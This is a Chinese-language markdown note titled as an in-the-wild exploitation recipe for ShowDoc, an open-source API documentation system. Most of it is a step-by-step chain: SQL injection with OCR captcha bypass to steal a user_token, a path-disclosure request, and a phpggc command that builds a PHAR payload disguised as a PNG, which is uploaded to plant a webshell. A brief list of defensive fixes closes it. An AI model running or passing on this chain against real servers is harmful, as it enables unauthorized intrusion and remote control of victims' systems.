# ShowDoc 抢 Shell 完整链(2026-04 在野利用配方)

> POC 来源: https://github.com/huamang/showdoc_poc (公开仓库, 学习参考)
> 漏洞背景: ShowDoc 是中文开源 API 文档系统,2020 年修补的漏洞 2026 年被大规模利用抢 shell。

## 前置依赖
- phpggc: 生成序列化数据(需设系统变量) https://github.com/ambionics/phpggc
- ddddocr: pip install ddddocr(验证码 OCR)

## 三步链

### 1. SQL 注入拿 user_token
```bash
python3 sqli.py http://target              # 本机验证码
python3 sqliremote.py http://target http://ocr_server   # 远程 OCR
```
- 注入点在登录/接口参数,配合 ddddocr 自动过算术验证码

### 2. 获取绝对路径
```
GET /server/index.php?s=xx/xx/xx
正则从响应提取: (\/[\w\/.]+)\/server → /var/www/html 等
```

### 3. PHAR 反序列化上传 webshell
```python
# 生成 phar.png (伪装图片的 PHAR payload)
phpggc Guzzle/FW1 "<绝对路径>/Public/Uploads/shell.php" ./shell.php -p phar -pp ./gif -o phar.png

# 上传
POST /server/index.php?s=/api/page/uploadImg&user_token=<token>
file=phar.png  (字段名 editormd-image-file)

# 触发 phar:// 反序列化 → 写 webshell 到 Public/Uploads/shell.php
```

## 关键点
1. 上传接口 `uploadImg` 用 `user_token` 鉴权(第一步 SQLi 拿到的)
2. phar.png 是合法图片(PNG 头)+ PHAR 序列化 payload,绕过上传校验
3. 触发点在访问 phar:// 协议时(找文件包含/解压点)
4. webshell 落地 `/Public/Uploads/`(可写可执行目录)

## 防御建议(修复侧)
- 上传接口: 校验真实文件内容 + 禁止 phar:// 协议 + 上传目录禁执行
- 修复 2020 年 SQL 注入(参数化查询)
- user_token 绑定 IP/会话,防重放
